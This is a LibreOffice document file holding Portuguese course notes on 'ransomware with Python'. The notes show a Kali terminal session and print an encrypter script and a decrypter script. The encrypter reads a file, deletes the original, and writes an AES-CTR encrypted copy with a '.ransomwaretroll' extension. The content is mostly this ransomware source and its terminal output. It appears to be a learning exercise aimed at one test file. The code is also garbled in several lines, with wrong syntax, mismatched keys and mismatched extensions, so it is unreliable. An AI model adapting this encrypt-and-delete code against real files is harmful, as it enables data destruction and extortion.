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0b66" officeooo:paragraph-rsid="000e0b66"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000e0b66" officeooo:paragraph-rsid="000fdf27"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000e0b66" officeooo:paragraph-rsid="0010080e"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000fdf27" officeooo:paragraph-rsid="000fdf27"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0010080e" officeooo:paragraph-rsid="0010080e"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000fdf27"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001008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NSOMWARE com PYTHON</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">ETAPA: Implementar um ransomware para criptografar arquivos utilizando a linguagem Python.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">ESTRUTURA:(Arquivo de projeto)</text:p>
      <text:p text:style-name="P1">*encrypter.py: código que irá <text:s/>criptografar os arquivos.</text:p>
      <text:p text:style-name="P1">*decrypter.py: código que irá descriptografar um arquivo previamente criptografado.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">PRATICA em TERMINAL:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">(<text:a xlink:type="simple" xlink:href="mailto:kali@kali" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">kali@kali</text:a>)~[~/projeto -ransomware]</text:p>
      <text:p text:style-name="P1">ls</text:p>
      <text:p text:style-name="P1">nano teste.txt</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">GNU nano <text:s/>6.3</text:p>
      <text:p text:style-name="P1">Este arquivo esta legivel</text:p>
      <text:p text:style-name="P1">[Ctrl + O]</text:p>
      <text:p text:style-name="P1">[Ctrl + X]</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">python encrypter.py</text:p>
      <text:p text:style-name="P1">ls </text:p>
      <text:p text:style-name="P1">nano teste.txt.ransomwaretroll</text:p>
      <text:p text:style-name="P1">[Ctrl + X] → texto criptografado e sair</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">python decrypter.py</text:p>
      <text:p text:style-name="P1">ls</text:p>
      <text:p text:style-name="P1">nano teste.txt</text:p>
      <text:p text:style-name="P1">[Ctrl + X] <text:s/>→ texto descriptografado e sair</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">nano decrypter.py</text:p>
      <text:p text:style-name="P1">nano</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">GNU nano 6.3</text:p>
      <text:p text:style-name="P1">import os</text:p>
      <text:p text:style-name="P1">import pyaes</text:p>
      <text:p text:style-name="P1">## abrir o arquivo criptografado</text:p>
      <text:p text:style-name="P1">file_name = ‘teste.txt.ransomwaretroll’</text:p>
      <text:p text:style-name="P1">file = open(file_name, ‘rb’)</text:p>
      <text:p text:style-name="P1">file_data = file.read()</text:p>
      <text:p text:style-name="P1">file.close()</text:p>
      <text:p text:style-name="P1">## chave de descriptografia</text:p>
      <text:p text:style-name="P1">key = b’testeransomware’</text:p>
      <text:p text:style-name="P1">aes = pyaes.AESModeOfOperationCTR(key)</text:p>
      <text:p text:style-name="P1">decrypt)data = aes.decrypt(file_data)</text:p>
      <text:p text:style-name="P1">## remover <text:span text:style-name="T1">o arquivo criptografado</text:span></text:p>
      <text:p text:style-name="P4">os.remove =(file_name)</text:p>
      <text:p text:style-name="P4">## criar um novo arquivo descriptografado</text:p>
      <text:p text:style-name="P4">new_file = ‘teste.txt’</text:p>
      <text:p text:style-name="P4">new_file = open(f’{new_file}’,’wb’)</text:p>
      <text:p text:style-name="P4">new_folder.write(decrypt_data)</text:p>
      <text:p text:style-name="P4">new_file.close()</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:soft-page-break/>[Ctrl + O] → <text:span text:style-name="T1">salvar</text:span></text:p>
      <text:p text:style-name="P2">[Ctrl + X] → <text:span text:style-name="T1">sair</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4">ls </text:p>
      <text:p text:style-name="P4">nano teste.txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">GNU nano 6.3</text:p>
      <text:p text:style-name="P4">Este arquivo esta legivel e descriptografado</text:p>
      <text:p text:style-name="P2">[Ctrl + O]</text:p>
      <text:p text:style-name="P2">[Ctrl + X]</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4">python encrypter.py</text:p>
      <text:p text:style-name="P4">la nano teste.txt.ransomwaretroll</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">mkdir projeto-ransomware</text:p>
      <text:p text:style-name="P4">cd projeto-ransomware</text:p>
      <text:p text:style-name="P4">touch teste.txt</text:p>
      <text:p text:style-name="P4">touch encrypter.py</text:p>
      <text:p text:style-name="P4">touch decrypter.py</text:p>
      <text:p text:style-name="P4">nano encrypter.py</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">GNU nano 6.3</text:p>
      <text:p text:style-name="P4">import os</text:p>
      <text:p text:style-name="P4">import pyaes</text:p>
      <text:p text:style-name="P4">## abrir o arquivo a ser criptografado</text:p>
      <text:p text:style-name="P4">file_name = ‘teste.txt’</text:p>
      <text:p text:style-name="P4">file = open(file_name, ‘rb’)</text:p>
      <text:p text:style-name="P4">file_data = file.read()</text:p>
      <text:p text:style-name="P4">file.close()</text:p>
      <text:p text:style-name="P4">## remover o arquivo original</text:p>
      <text:p text:style-name="P4">os.remove(file_name)</text:p>
      <text:p text:style-name="P4">## definir a chave de encriptografia</text:p>
      <text:p text:style-name="P4">key = b’testeransomwares’</text:p>
      <text:p text:style-name="P4">aes = pyaes.AESModeOfOperationCTR(key)</text:p>
      <text:p text:style-name="P4">## criptografar o arquivo</text:p>
      <text:p text:style-name="P4">crypto_data = aes.encrypt(file_data)</text:p>
      <text:p text:style-name="P4">## salvar o arquivo criptografado</text:p>
      <text:p text:style-name="P4">new_file = file_name + ‘.<text:span text:style-name="T2">ransomwareretroll’</text:span></text:p>
      <text:p text:style-name="P5">new_file = open(f’{new_file}’, ‘wb’)</text:p>
      <text:p text:style-name="P5">new_file.write(crypto_data)</text:p>
      <text:p text:style-name="P5">new_file.close()</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3">[Ctrl + O]</text:p>
      <text:p text:style-name="P3">[Ctrl + X]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">(<text:a xlink:type="simple" xlink:href="mailto:kali@kali" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">kali@kali</text:a>)~[~/ransomware]</text:p>
      <text:p text:style-name="P5">ls</text:p>
      <text:p text:style-name="P5">nano teste.txt</text:p>
      <text:p text:style-name="P5">Este e um arquivo descriptografado e perfeitamente legivel-Lucas</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3">[Ctrl + O]</text:p>
      <text:p text:style-name="P3">[Ctrl + X]</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/>python encrypter.py</text:p>
      <text:p text:style-name="P5">ls </text:p>
      <text:p text:style-name="P5">nano teste.txt.ransomwaretroll</text:p>
      <text:p text:style-name="P5">Crtl + X</text:p>
      <text:p text:style-name="P5">python decrypter.py</text:p>
      <text:p text:style-name="P5">ls </text:p>
      <text:p text:style-name="P5">nano teste.txt</text:p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23:20:47.257145114</meta:creation-date>
    <dc:date>2024-01-10T23:49:35.422379394</dc:date>
    <meta:editing-duration>PT5M7S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="93" meta:word-count="288" meta:character-count="2149" meta:non-whitespace-character-count="1947"/>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>